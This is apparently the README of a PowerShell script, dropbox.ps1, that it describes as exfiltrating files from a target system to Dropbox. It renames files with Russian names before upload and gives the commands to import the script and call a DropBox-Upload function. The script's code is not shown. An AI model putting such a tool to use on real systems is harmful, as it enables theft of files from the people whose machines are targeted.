## About
This script exfiltrates files from a target system preserving the orginal name of them unless they are in russian.

Files named in russian will be coppied to `C:\Users\Public\Documents` with a new random name before the upload to avoid errors.

## Syntax
1) Import the script
   
`. .\dropbox.ps1`

2) Upload files

`DropBox-Upload -FileName "file.txt"`

or 

`"file.txt" | DropBox-Upload`
